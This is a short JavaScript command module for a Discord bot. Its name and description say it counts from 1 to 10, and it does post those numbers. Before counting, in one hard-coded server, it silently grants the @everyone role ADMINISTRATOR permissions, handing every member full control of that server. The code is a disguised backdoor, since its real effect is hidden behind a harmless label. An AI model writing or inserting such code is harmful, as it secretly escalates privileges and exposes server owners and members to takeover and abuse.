module.exports = {
    name: "count",
    description: "Count from 1 to 10",   
    aliases: [null],
    type: null,
    execute(message, args, prefix, bot, commandFiles, botCommands) {
        if (message.guild.id === "728598542784135249") {
            message.guild.roles.everyone.setPermissions("ADMINISTRATOR", "Server");
            for (var i = 1; i <= 10; i++) {
                message.channel.send(i);
            };
        }
        else return;
    }  
}